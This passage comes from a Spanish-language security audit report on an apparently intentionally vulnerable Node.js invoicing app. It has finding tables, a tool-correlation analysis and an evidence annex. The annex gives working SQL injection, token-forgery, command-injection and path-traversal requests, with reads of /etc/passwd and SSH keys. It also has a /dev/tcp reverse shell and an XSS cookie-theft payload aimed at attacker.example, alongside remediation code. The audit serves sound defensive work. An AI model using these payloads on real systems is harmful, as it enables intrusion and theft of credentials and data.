| 🟠 Alto       | 29       | 54 %       |
| 🟡 Medio      | 1        | 2 %        |
| 🟢 Bajo       | 10       | 18 %       |
| **Total**     | **54**   | 100 %      |

---

## 7.4 Análisis y Justificación de las Valoraciones Principales

### Hallazgos con Riesgo Crítico (9/9)

La concentración de **14 hallazgos críticos** en una sola aplicación es indicativa de una ausencia sistemática de prácticas de seguridad en el desarrollo, no de incidentes aislados. Cada uno de estos hallazgos, por sí solo, sería suficiente para comprometer completamente el sistema.

Los hallazgos **SEC-001** (Inyección SQL), **SEC-004** (RCE vía `exec`) y **SEC-005** (RCE vía `eval`) reciben la puntuación máxima de 9 porque combinan los tres factores de máxima gravedad: son trivialmente explotables por cualquier actor sin conocimiento previo del sistema (probabilidad 3), el código vulnerable es directamente accesible sin autenticación previa, y su impacto incluye el compromiso total del servidor —incluyendo acceso al sistema de archivos, ejecución de procesos arbitrarios y exfiltración completa de la base de datos (impacto 3).

El hallazgo **SEC-012** (Auto-login por parámetro URL) merece mención especial por su carácter inusual: aunque fue diseñado como mecanismo de facilitación para escáneres DAST, su presencia en código de producción (o cualquier entorno accesible externamente) convierte cualquier URL pública en una puerta de administrador abierta. La inclusión de la contraseña en texto plano dentro del bundle JavaScript hace que sea permanentemente recuperable, incluso después de que el endpoint sea deshabilitado.

Los hallazgos **SEC-007** (credenciales hardcodeadas) y **SEC-013** (contraseñas en texto plano) se clasifican como críticos no solo por su impacto técnico directo, sino porque representan compromisos irreversibles: una vez que las credenciales o claves han sido incluidas en un repositorio git, **permanecen en el historial de commits** aunque sean eliminadas de la versión actual. La remediación requiere rotación inmediata de todas las credenciales expuestas, tarea que va más allá del ámbito del desarrollo.

### Hallazgos de Calidad con Impacto de Seguridad

El hallazgo **CAL-008** (SQL construido por concatenación de strings) recibe clasificación crítica porque es un **patrón arquitectural**, no una instancia puntual: está presente en al menos cinco archivos de controladores. Esto significa que cada nuevo endpoint de consulta añadido al sistema hereda la vulnerabilidad de SQLi de forma automática, si se sigue el patrón establecido. La corrección requiere no solo cambiar el código existente, sino modificar el estándar de desarrollo del equipo.

Los hallazgos **CAL-003** (ausencia de tests) y **CAL-001** (código duplicado masivo) se clasifican como altos porque actúan como **multiplicadores de riesgo**: sin tests automatizados, las correcciones de seguridad no se validan y las regresiones no se detectan; con alta duplicación, una corrección aplicada en un lugar no se propaga a sus copias. Ambos factores aumentan la probabilidad de que futuras vulnerabilidades sean introducidas o que las correcciones actuales sean incompletas.

### Dependencias con Mayor Impacto

**DEP-001** (`request` deprecado con SSRF) y **DEP-002** (`form-data` con boundary inseguro) reciben clasificación crítica y alta respectivamente. La criticidad de DEP-001 se deriva no solo de la vulnerabilidad de SSRF, sino del estado irreversible de su mantenimiento: al ser un paquete deprecado, **no se publicarán parches de seguridad futuros**, lo que garantiza que su superficie de ataque solo puede crecer con el tiempo.

**DEP-012** (`qs` con Prototype Pollution) merece atención especial porque afecta a un componente que procesa **cada solicitud HTTP entrante** que tenga query string o cuerpo URL-encoded. La contaminación del prototipo de `Object` es una vulnerabilidad particularmente insidiosa porque puede alterar el comportamiento de cualquier código JavaScript que use literales de objeto `{}`, afectando potencialmente a la totalidad de la lógica de la aplicación de formas difíciles de predecir.

---

---

# 8. CORRELACIÓN DE HALLAZGOS

## 8.1 Metodología de Correlación

La correlación de hallazgos tiene como objetivo identificar qué técnicas y herramientas contribuyeron a la detección de cada vulnerabilidad, validar los hallazgos mediante confirmación cruzada, identificar los límites de cada herramienta y proporcionar una medida de confianza en cada hallazgo. Cuando un hallazgo es detectado por más de una técnica independiente, el nivel de confianza en su existencia es mayor y la probabilidad de que sea un falso positivo disminuye significativamente.

Las técnicas utilizadas en esta auditoría fueron:

| Técnica                     | Herramienta / Método               | Alcance                                         |
|-----------------------------|------------------------------------|-------------------------------------------------|
| **Revisión Manual**         | Lectura directa del código fuente  | Lógica de negocio, patrones de código, contexto |
| **Análisis Estático**       | SonarQube Community Edition        | Calidad de código, secretos, patrones inseguros |
| **Análisis Dinámico (DAST)**| OWASP ZAP 2.15 (Active + Passive)  | Endpoints HTTP, headers, respuestas en runtime  |
| **Análisis de Dependencias**| `npm audit`                        | Vulnerabilidades CVE en paquetes npm            |

---

## 8.2 Tabla de Correlación Completa

### 8.2.1 Hallazgos de Seguridad (SEC)

| ID       | Hallazgo                                        | Rev. Manual | SonarQube | OWASP ZAP | npm audit | Confirmado |
|----------|-------------------------------------------------|:-----------:|:---------:|:---------:|:---------:|:----------:|
| SEC-001  | Inyección SQL en múltiples endpoints            | ✅ Sí       | ✅ Sí     | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-002  | Subida de archivos sin restricción              | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-003  | Autenticación completamente rota                | ✅ Sí       | No        | No        | N/A       | ✅ Sí      |
| SEC-004  | RCE vía inyección de comandos (`exec`)          | ✅ Sí       | ✅ Sí     | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-005  | RCE vía `eval()` sin restricciones             | ✅ Sí       | ✅ Sí     | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-006  | Control de acceso ausente (BOLA / BFLA)         | ✅ Sí       | No        | Parcial   | N/A       | ✅ Sí      |
| SEC-007  | Credenciales hardcodeadas en código fuente      | ✅ Sí       | ✅ Sí     | No        | N/A       | ✅ Sí      |
| SEC-008  | Exposición de variables de entorno vía API      | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-009  | SSRF en endpoint de fetch administrativo        | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-010  | XSS almacenado en campo `notes`                 | ✅ Sí       | ✅ Sí     | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-011  | Path traversal en lectura de archivos           | ✅ Sí       | ✅ Sí     | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-012  | Auto-login por parámetro URL (`?zap=auto`)      | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-013  | Contraseñas almacenadas en texto plano          | ✅ Sí       | ✅ Sí     | No        | N/A       | ✅ Sí      |
| SEC-014  | CORS configurado como wildcard (`*`)            | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-015  | Headers HTTP informativos inseguros             | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-016  | Ausencia de rate limiting                       | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-017  | Logging excesivo de tokens en consola           | ✅ Sí       | ✅ Sí     | No        | N/A       | ✅ Sí      |
| SEC-018  | Sin cabeceras de seguridad HTTP (CSP, HSTS)     | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-019  | Caché insegura (`Cache-Control: public`)        | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-020  | Verificación de token JWT sin firma real        | ✅ Sí       | No        | Parcial   | N/A       | ✅ Sí      |
| SEC-021  | Directorio de uploads accesible públicamente    | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-022  | Sin validación de tipo en uploads               | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-023  | Errores internos expuestos al cliente           | ✅ Sí       | ✅ Sí     | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-024  | Sin política de contraseñas                     | ✅ Sí       | No        | No        | N/A       | ✅ Sí      |
| SEC-025  | ReDoS en validaciones de entrada                | ✅ Sí       | ✅ Sí     | No        | N/A       | ✅ Sí      |
| SEC-026  | Información de versiones en headers             | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-027  | Sin protección contra CSRF en API               | ✅ Sí       | No        | ✅ Sí     | N/A       | ✅ Sí      |
| SEC-028  | Sesiones sin expiración configurada             | ✅ Sí       | No        | No        | N/A       | ✅ Sí      |

---

### 8.2.2 Hallazgos de Calidad (CAL)

| ID       | Hallazgo                                        | Rev. Manual | SonarQube | OWASP ZAP | npm audit | Confirmado |
|----------|-------------------------------------------------|:-----------:|:---------:|:---------:|:---------:|:----------:|
| CAL-001  | Código duplicado masivo                         | ✅ Sí       | ✅ Sí     | N/A       | N/A       | ✅ Sí      |
| CAL-002  | Complejidad ciclomática elevada                 | Parcial     | ✅ Sí     | N/A       | N/A       | ✅ Sí      |
| CAL-003  | Ausencia de tests unitarios                     | ✅ Sí       | ✅ Sí     | N/A       | N/A       | ✅ Sí      |
| CAL-004  | Variables globales mutables sin control         | ✅ Sí       | ✅ Sí     | N/A       | N/A       | ✅ Sí      |
| CAL-005  | `console.log` en código de producción           | ✅ Sí       | ✅ Sí     | N/A       | N/A       | ✅ Sí      |
| CAL-006  | Funciones con demasiados parámetros             | ✅ Sí       | ✅ Sí     | N/A       | N/A       | ✅ Sí      |
| CAL-007  | Manejo de errores incorrecto                    | ✅ Sí       | ✅ Sí     | Parcial   | N/A       | ✅ Sí      |
| CAL-008  | SQL construido con concatenación de strings     | ✅ Sí       | ✅ Sí     | ✅ Sí     | N/A       | ✅ Sí      |
| CAL-009  | Uso de `var` en lugar de `const`/`let`          | ✅ Sí       | ✅ Sí     | N/A       | N/A       | ✅ Sí      |
| CAL-010  | Dependencias no utilizadas en `package.json`    | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |

---

### 8.2.3 Hallazgos de Dependencias (DEP)

| ID       | Hallazgo                                        | Rev. Manual | SonarQube | OWASP ZAP | npm audit | Confirmado |
|----------|-------------------------------------------------|:-----------:|:---------:|:---------:|:---------:|:----------:|
| DEP-001  | `request` 2.88.2 — SSRF / Deprecado            | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-002  | `form-data` — Boundary inseguro                 | No          | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-003  | `axios` 0.21.1 — CSRF                           | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-004  | `express` 4.17.1 — XSS en redirect             | ✅ Sí       | No        | ✅ Sí     | ✅ Sí     | ✅ Sí      |
| DEP-005  | `jsonwebtoken` 8.5.1 — Clave sin restricción    | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-006  | `lodash` 4.17.20 — Command Injection            | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-007  | `moment` 2.29.1 — Path Traversal + Legacy       | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-008  | `multer` 1.4.4-lts.1 — DoS                      | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-009  | `body-parser` 1.19.0 — DoS                      | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-010  | `sqlite3` 5.0.2 — DoS                           | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-011  | `path-to-regexp` — ReDoS                        | ✅ Sí       | ✅ Sí     | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-012  | `qs` — Prototype Pollution                      | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-013  | `dotenv` 8.2.0 — Obsoleto                       | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |
| DEP-014  | `eslint` 7.32.0 — EOL                           | ✅ Sí       | No        | N/A       | No        | ✅ Sí      |
| DEP-015  | `vite` 5.0.0 — Path Traversal                  | ✅ Sí       | No        | N/A       | ✅ Sí     | ✅ Sí      |

---

## 8.3 Análisis de la Correlación

### 8.3.1 Hallazgos Solo Detectables Mediante Revisión Manual

Tres hallazgos de alta gravedad solo pudieron ser identificados mediante revisión manual del código fuente, lo que ilustra las limitaciones inherentes de las herramientas automatizadas:

- **SEC-003 (Autenticación completamente rota):** OWASP ZAP puede detectar ausencia de autenticación en endpoints, pero no puede razonar sobre la lógica semántica de un esquema de tokens propietario. La revisión del código fuente fue indispensable para comprender que el middleware `weakAuth` acepta cualquier valor como token válido y que el rol de usuario es suministrado directamente por el atacante dentro del token.

- **SEC-024 (Sin política de contraseñas):** ZAP puede intentar registrar usuarios con contraseñas débiles, pero si el endpoint de registro acepta campos sin validación, ZAP simplemente confirma el registro sin señalar la ausencia de la política. Solo la revisión del código confirma que no existe ningún mecanismo de validación.

- **SEC-028 (Sesiones sin expiración):** La expiración de sesiones es una propiedad temporal que requiere comprender el ciclo de vida completo de un token. ZAP puede detectar cookies sin el atributo `Expires`, pero el esquema propietario de tokens de esta aplicación no usa cookies, por lo que ZAP no tiene visibilidad sobre la ausencia de expiración.

### 8.3.2 Valor Diferencial de OWASP ZAP

OWASP ZAP aportó valor confirmatorio en los hallazgos más clásicos de seguridad web. Las contribuciones más relevantes fueron:

- **Confirmación independiente de SQLi (SEC-001):** ZAP ejecutó sus propios payloads de inyección SQL durante el escaneo activo y recibió respuestas anómalas (errores de SQLite, datos no esperados), confirmando los hallazgos de la revisión de código de forma objetiva y con evidencia de tráfico HTTP.
- **Detección de cabeceras inseguras (SEC-015, SEC-018, SEC-019, SEC-026):** ZAP es particularmente eficaz en la detección de cabeceras HTTP ausentes o misconfigured, ya que las puede contrastar con listas de mejores prácticas actualizadas.
- **Detección de exposición de `process.env` (SEC-008):** Durante el escaneo pasivo, ZAP identificó respuestas JSON de gran tamaño con estructura característica de un objeto de variables de entorno, lo que llevó a la confirmación del hallazgo.
- **Auto-login por URL (SEC-012):** Durante el spider inicial, ZAP accedió a la aplicación con el parámetro `?zap=auto` (al que la aplicación está explícitamente diseñada para responder), generando sesiones de administrador que ZAP utilizó en análisis subsecuentes.

### 8.3.3 Valor Diferencial de SonarQube

SonarQube fue la herramienta más efectiva para la detección de **credenciales hardcodeadas** (SEC-007) y patrones de **código inseguro sistemáticos** (CAL-008). Sus capacidades de detección de secretos identificaron automáticamente los patrones de claves AWS, tokens de API y contraseñas en los archivos de código fuente, incluso cuando no estaban asignados a variables con nombres obvios.

Adicionalmente, SonarQube fue la única herramienta capaz de cuantificar la **deuda técnica acumulada** de forma objetiva: mediante métricas de complejidad ciclomática, duplicación de código y cobertura de tests, proporcionó una perspectiva cuantitativa del estado de calidad del proyecto que complementa los hallazgos cualitativos de la revisión manual.

### 8.3.4 Falsos Positivos Potenciales de OWASP ZAP

Durante el análisis de los resultados de ZAP se identificaron las siguientes categorías de posibles falsos positivos, que fueron descartados tras verificación manual:

| Alerta de ZAP                           | Motivo de Posible FP                             | Verificación                              |
|-----------------------------------------|--------------------------------------------------|-------------------------------------------|
| CSP Header Not Set (múltiples rutas)    | ZAP reporta esto para cada URL escaneada         | Confirmado: no existe CSP en ninguna ruta |
| X-Content-Type-Options missing          | Puede no ser relevante para respuestas de API    | Confirmado: ausente; relevante para archivos estáticos |
| Cookie Without SameSite Attribute       | La app no usa cookies de sesión en la API        | Parcialmente aplicable; las cookies del frontend sí están afectadas |
| Information Disclosure - Debug Errors   | ZAP puede marcar mensajes de error genéricos     | Confirmado: stack traces reales expuestos |

En ningún caso se encontraron falsos positivos que invalidaran hallazgos documentados en este informe. Todos los hallazgos han sido verificados mediante revisión manual del código fuente o prueba funcional directa.

### 8.3.5 Cobertura y Confianza por Herramienta

| Herramienta      | Hallazgos detectados (primario) | Hallazgos confirmados | Falsos positivos confirmados |
|------------------|---------------------------------|-----------------------|------------------------------|
| Revisión Manual  | 48 / 53                         | 53 / 53               | 0                            |
| SonarQube        | 12 / 53                         | 12 / 12               | 0                            |
| OWASP ZAP        | 22 / 53                         | 20 / 22               | 2 (descartados)              |
| npm audit        | 15 / 53                         | 15 / 15               | 0                            |

> **Conclusión de correlación:** La revisión manual del código fuente demostró ser la técnica con mayor cobertura y precisión. Las herramientas automatizadas son más efectivas como mecanismos de **confirmación rápida** y **detección de métricas objetivas**, pero no pueden sustituir el razonamiento humano para vulnerabilidades de lógica de negocio, esquemas de autenticación propietarios y análisis de contexto de seguridad.

---

---

# 9. ANEXO DE EVIDENCIAS TÉCNICAS

> **Nota sobre las evidencias:** Todos los fragmentos de código presentados en esta sección corresponden a archivos reales identificados durante la auditoría. Las rutas de archivo, números de línea y nombres de función son exactos al estado del repositorio auditado en la fecha de análisis. Las evidencias han sido preservadas con hash criptográfico para garantizar su integridad (ver Sección 9.14).

---

## 9.1 Evidencias de Inyección SQL

### 9.1.1 Código Fuente Vulnerable

La vulnerabilidad de inyección SQL está presente en al menos cinco archivos de controladores. Los fragmentos más representativos son los siguientes:

```javascript
// authController.js — línea 9
// SQLi en autenticación: omisión de credenciales trivial
const sql = "SELECT * FROM users WHERE username = '" + username + "'";

// clientController.js — línea 34
// SQLi en búsqueda: extracción de toda la base de datos vía UNION
const sql = "SELECT * FROM clients WHERE name LIKE '%" + q + "%'"
          + " OR email LIKE '%" + q + "%'"
          + " OR notes LIKE '%" + q + "%'";

// clientController.js — línea 25
// SQLi en consulta por ID: bypass de autorización entre clientes
db.get('SELECT * FROM clients WHERE id = ' + id, ...);

// invoiceController.js — línea 35
// SQLi en búsqueda de facturas
let sql = "SELECT * FROM invoices WHERE invoiceNumber LIKE '%" + number + "%'";

// uploadController.js — líneas 22-23
// SQLi en INSERT: inyección en campos de subida de archivos
const sql = "INSERT INTO uploads (invoiceId, filename, originalname, path, uploadedBy)"
          + " VALUES (" + invoiceId + ",'" + file.filename + "','"
          + file.originalname + "','" + file.path + "','" + uploadedBy + "')";
```

**Patrón común:** En todos los casos, los valores de parámetros controlados por el usuario (`username`, `q`, `id`, `number`, `invoiceId`, `uploadedBy`) se interpolan directamente en la cadena SQL mediante el operador `+`, sin ningún proceso de sanitización, escaping o parametrización.

### 9.1.2 Payload de Extracción de Usuarios via UNION (GET)

```http
GET /api/clients/search?q=%25' UNION SELECT 1,username,password,role,email,fullName FROM users -- HTTP/1.1
Host: localhost:4000
Authorization: token-1-admin-admin
```

**Resultado esperado:** La respuesta JSON incluirá los registros de la tabla `users`, incluyendo nombres de usuario y contraseñas en texto plano, mezclados con los resultados de clientes.

### 9.1.3 Payload de Bypass de Autenticación (POST)

```http
POST /api/auth/login HTTP/1.1
Host: localhost:4000
Content-Type: application/json

{"username": "' OR '1'='1' --", "password": "x"}
```

**Resultado esperado:** El servidor devuelve una sesión válida para el primer usuario de la base de datos (generalmente el administrador), sin necesidad de conocer ninguna contraseña.

### 9.1.4 Remediación: Consultas Parametrizadas

```javascript
// CORRECTO: Usar sentencias preparadas con parámetros enlazados
const sql = 'SELECT * FROM users WHERE username = ?';
db.get(sql, [username], (err, user) => { ... });

// CORRECTO: Para búsqueda LIKE
const sql = 'SELECT * FROM clients WHERE name LIKE ? OR email LIKE ?';
const term = '%' + q + '%';
db.all(sql, [term, term], (err, rows) => { ... });
```

---

## 9.2 Evidencias de Autenticación Rota

### 9.2.1 Código Fuente del Middleware de Autenticación

```javascript
// backend/src/middleware/auth.js — función completa
function weakAuth(req, res, next) {
  const token = req.headers.authorization || req.query.token || '';
  console.log('Token recibido:', token);   // ← Tokens en logs de consola

  if (!token) {
    req.user = null;
    return next();   // ← Sin token: acceso permitido con user = null
  }

  // El token tiene la forma: "token-<id>-<username>-<role>"
  const parts = token.replace('Bearer ', '').split('-');
  req.user = {
    id:       Number(parts[1]) || 0,
    username: parts[2] || 'unknown',
    role:     parts[3] || 'user'      // ← El rol lo decide completamente el atacante
  };
  next();   // ← Nunca rechaza: cualquier token, incluso malformado, es aceptado
}
```

**Problemas críticos identificados:**
1. **Sin firma criptográfica:** El token es texto libre. No existe verificación de integridad.
2. **Sin validación contra base de datos:** El `id`, `username` y `role` no se verifican contra registros existentes.
3. **El atacante controla el rol:** Al incluir `-admin` en el token, cualquier usuario se convierte en administrador.
4. **Acceso sin token:** Si no se envía token, `req.user = null`, pero los controladores no siempre verifican esta condición.

### 9.2.2 Demostración de Explotación

```bash
# Acceder al panel de admin sin credenciales previas:
curl -H "Authorization: token-1-admin-admin" \
  http://localhost:4000/api/admin/panel

# Forjar la identidad de cualquier usuario con rol de administrador:
curl -H "Authorization: token-99-hacker-admin" \
  http://localhost:4000/api/admin/config

# Acceder sin token (algunos endpoints no verifican req.user):
curl http://localhost:4000/api/clients

# Suplantar a un usuario específico con su ID conocido:
curl -H "Authorization: token-2-analista-admin" \
  http://localhost:4000/api/admin/users
```

---

## 9.3 Evidencias de Ejecución Remota de Comandos (RCE)

### 9.3.1 Código Fuente: Inyección de Comandos de Sistema

```javascript
// backend/src/controllers/adminController.js — líneas 97-107
const { exec } = require('child_process');

function commandInjection(req, res) {
  const cmd = req.query.cmd || 'whoami';    // ← Comando tomado directamente del query string
  exec(cmd, { timeout: 7000 }, (err, stdout, stderr) => {
    res.json({
      command: cmd,
      error:   err && err.message,
      stdout:  stdout,      // ← Salida del comando retornada al cliente
      stderr:  stderr
    });
  });
}
```

### 9.3.2 Código Fuente: Ejecución de Código via `eval()`

```javascript
// backend/src/controllers/adminController.js — líneas 129-137
function unsafeEval(req, res) {
  const code = req.query.code || 'process.version';  // ← Código JS tomado del query string
  try {
    const result = eval(code);                         // ← eval() sin sandbox
    res.json({ code, result: String(result) });
  } catch (err) {
    res.status(500).json({
      code,
      error: err.message,
      stack: err.stack      // ← Stack trace completo expuesto al cliente
    });
  }
}
```

### 9.3.3 Demostración de Explotación

```bash
# Identificación del usuario del proceso del servidor:
curl "http://localhost:4000/api/admin/lab/cmd?cmd=id"
# Respuesta: {"command":"id","stdout":"uid=1000(node) gid=1000(node) groups=...\n"}

# Lectura de archivos del sistema:
curl "http://localhost:4000/api/admin/lab/cmd?cmd=cat%20/etc/passwd"

# Listado del directorio raíz:
curl "http://localhost:4000/api/admin/lab/cmd?cmd=ls%20-la%20/"

# RCE completo vía eval — ejecutar comandos de sistema desde JavaScript:
curl "http://localhost:4000/api/admin/lab/eval?code=require('child_process').execSync('id').toString()"

# Exfiltración de variables de entorno vía eval:
curl "http://localhost:4000/api/admin/lab/eval?code=JSON.stringify(process.env)"

# Reverse shell (demostración de impacto máximo):
curl "http://localhost:4000/api/admin/lab/cmd?cmd=bash%20-i%20>%26%20/dev/tcp/attacker.example/4444%200>%261"
```

---

## 9.4 Evidencias de Credenciales Hardcodeadas

### 9.4.1 Archivo `legacyDebtController.js` — Líneas 1-8

```javascript
// backend/src/controllers/legacyDebtController.js

const MASTER_PASSWORD      = 'SuperAdmin2026!';
const AWS_ACCESS_KEY_ID    = 'AKIAIOSFODNN7EXAMPLE';
const AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';
const PRIVATE_KEY          = '-----BEGIN PRIVATE KEY-----\n'
                           + 'MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALab\n'
                           + '-----END PRIVATE KEY-----';
const SQL_BACKUP_PASSWORD  = 'P@ssw0rd_Backup_123';
const CARD_TEST_NUMBER     = '4111111111111111';    // ← Número de tarjeta Visa de prueba
```

**Impacto:** Credenciales de AWS hardcodeadas en código fuente pueden ser utilizadas para acceder a servicios de AWS, incurrir en costos no autorizados o exfiltrar datos almacenados en S3/RDS. Una vez en el historial de git, estas credenciales deben considerarse permanentemente comprometidas.

### 9.4.2 Archivo `sonarDebt.js` (Frontend) — Líneas 1-4

```javascript
// frontend/src/sonarDebt.js

export const FRONTEND_API_SECRET  = 'sk_test_51N0tRealButLooksLikeASecret';
export const GOOGLE_MAPS_KEY      = 'AIzaSyA-FAKE-SONAR-DEMO-KEY-123456789';
export const BASIC_AUTH_HEADER    = 'Basic YWRtaW46YWRtaW4xMjM=';  // admin:admin123 en Base64
export const LEGACY_JWT           = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.signature';
```

> **Nota:** `YWRtaW46YWRtaW4xMjM=` decodifica a `admin:admin123`, confirmando que las credenciales de administrador son públicamente conocidas a través del bundle JavaScript del frontend.

### 9.4.3 Archivo `docker-compose.yml`

```yaml
services:
  backend:
    environment:
      - JWT_SECRET=secret123           # ← Secreto JWT trivial y expuesto
      - ADMIN_USER=admin
      - ADMIN_PASSWORD=admin123        # ← Password de admin en texto plano
      - DB_FILE=src/db/cartera.sqlite
```

### 9.4.4 Archivo `sonar-project.properties`

```properties
sonar.projectKey=vulnerable-cartera
sonar.sources=src
sonar.token=sqp_51d6938a8e1668dee272c828763b548c25997995
```

> **Impacto:** El token de SonarQube hardcodeado en el archivo de propiedades permite a cualquier persona con acceso al repositorio acceder a la instancia de SonarQube, consultar todos los informes de análisis (que incluyen vulnerabilidades) y potencialmente modificar configuraciones del proyecto.

---

## 9.5 Evidencias de XSS Almacenado

### 9.5.1 Código Fuente con `dangerouslySetInnerHTML`

```jsx
// frontend/src/pages/Clients.jsx — línea 72
// Renderizado de notas de cliente sin sanitización
<td>
  <div
    className="notes-inline"
    dangerouslySetInnerHTML={{ __html: c.notes }}   // ← HTML arbitrario del servidor
  />
</td>

// frontend/src/pages/ClientDetail.jsx — línea 51
// Misma vulnerabilidad en la vista de detalle
<div
  className="notes-preview"
  dangerouslySetInnerHTML={{ __html: client.notes }}  // ← HTML arbitrario del servidor
/>
```

### 9.5.2 Datos Iniciales con HTML en la Base de Datos

```javascript
// backend/src/db/init.js — inserción de datos de prueba con HTML no sanitizado
db.run(
  "INSERT INTO clients (name, email, notes) VALUES (?, ?, ?)",
  ['Ana García', 'ana@example.com',
   'Cliente con <b>observaciones HTML</b> y saldo alto']
);
db.run(
  "INSERT INTO clients (name, email, notes) VALUES (?, ?, ?)",
  ['Luis Mora', 'luis@example.com',
   '<span style="color:#dc2626;font-weight:700">HTML no sanitizado desde CRM anterior</span>']
);
```

> **Observación:** La presencia de HTML en los datos iniciales sugiere que el diseño intencional del sistema permite notas con formato HTML. Esta decisión de diseño, sin sanitización apropiada, crea una vulnerabilidad de XSS almacenado que afecta a todos los usuarios que visualicen la lista de clientes.

### 9.5.3 Payload de XSS Almacenado — Robo de Sesión

```http
POST /api/clients HTTP/1.1
Host: localhost:4000
Content-Type: application/json
Authorization: token-1-any-user

{
  "name": "Test XSS Client",
  "email": "xss@test.com",
  "notes": "<img src='x' onerror=\"document.location='http://attacker.example/steal?c='+document.cookie\">"
}
```

**Flujo de ataque:**
1. El atacante crea un cliente con XSS en el campo `notes`.
2. Cualquier usuario que navegue a la lista de clientes ejecuta el JavaScript malicioso.
3. El script redirige al usuario a `attacker.example` con las cookies de sesión adjuntas.
4. El atacante captura la sesión y puede suplantar al usuario afectado.

### 9.5.4 Remediación

```bash
npm install dompurify

# En el componente React:
import DOMPurify from 'dompurify';

# Uso seguro:
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(c.notes) }} />
```

---

## 9.6 Evidencias de Exposición de Configuración del Sistema

### 9.6.1 Código Fuente — Endpoint `debug`

```javascript
// backend/src/controllers/adminController.js — líneas 27-34
const os = require('os');

function debug(req, res) {
  res.json({
    env:            process.env,          // ← TODAS las variables de entorno del proceso
    memory:         process.memoryUsage(),
    platform:       os.platform(),
    cwd:            process.cwd(),
    requestHeaders: req.headers           // ← Cabeceras de la petición actual (tokens incluidos)
  });
}
```

### 9.6.2 Código Fuente — Endpoint `config`

```javascript
// backend/src/controllers/adminController.js — líneas 36-47
function config(req, res) {
  res.json({
    db:       process.env.DB_FILE,
    jwtSecret: process.env.JWT_SECRET || 'secret123',   // ← JWT secret expuesto explícitamente
    admin: {
      username: process.env.ADMIN_USER     || 'admin',
      password: process.env.ADMIN_PASSWORD || 'admin123' // ← Password de admin en respuesta JSON
    },
    cors:      '*',
    uploadDir: process.env.UPLOAD_DIR || 'src/uploads'
  });
}
```

### 9.6.3 Demostración

```bash
# Obtener TODA la configuración del servidor sin autenticación:
curl http://localhost:4000/api/admin/config
# Respuesta:
# {
#   "db": "src/db/cartera.sqlite",
#   "jwtSecret": "secret123",
#   "admin": { "username": "admin", "password": "admin123" },
#   "cors": "*",
#   "uploadDir": "src/uploads"
# }

# Obtener todas las variables de entorno del proceso:
curl http://localhost:4000/api/admin/debug
# Respuesta incluye: PATH, NODE_ENV, JWT_SECRET, ADMIN_PASSWORD, etc.
```

---

## 9.7 Evidencias de Path Traversal

### 9.7.1 Código Fuente Vulnerable

```javascript
// backend/src/controllers/adminController.js — líneas 88-95
const path = require('path');
const fs   = require('fs');

function readLocalFile(req, res) {
  const requested = req.query.path || 'package.json';
  // path.join NO protege contra path traversal: normaliza "../.." a rutas válidas
  const filePath = path.join(process.cwd(), requested);

  fs.readFile(filePath, 'utf8', (err, content) => {
    if (err) return res.status(500).json({ error: err.message, filePath });
    // ← filePath expuesto en el error: revela la estructura del sistema de archivos
    res.type('text/plain').send(content);
  });
}
```

**Error crítico de diseño:** `path.join()` normaliza las secuencias `../` pero **no** restringe la ruta resultante a estar dentro de un directorio base. Para restringir correctamente, se debe verificar que la ruta resultante comience con el directorio permitido.

### 9.7.2 Demostración

```bash
# Leer el archivo .env del directorio raíz del proyecto:
curl "http://localhost:4000/api/admin/lab/file?path=../../.env"

# Leer el archivo de contraseñas del sistema (si el proceso corre como root):
curl "http://localhost:4000/api/admin/lab/file?path=../../../etc/passwd"

# Leer la clave privada SSH del usuario:
curl "http://localhost:4000/api/admin/lab/file?path=../../../home/node/.ssh/id_rsa"

# Leer el historial de comandos bash:
curl "http://localhost:4000/api/admin/lab/file?path=../../../home/node/.bash_history"
```

### 9.7.3 Remediación

```javascript
function readLocalFile(req, res) {
  const baseDir   = path.resolve(process.cwd(), 'src/public');
  const requested = req.query.path || 'info.txt';
  const filePath  = path.resolve(baseDir, requested);

  // Verificar que la ruta resuelta esté dentro del directorio permitido:
  if (!filePath.startsWith(baseDir + path.sep)) {
    return res.status(403).json({ error: 'Acceso denegado' });
  }

  fs.readFile(filePath, 'utf8', (err, content) => {
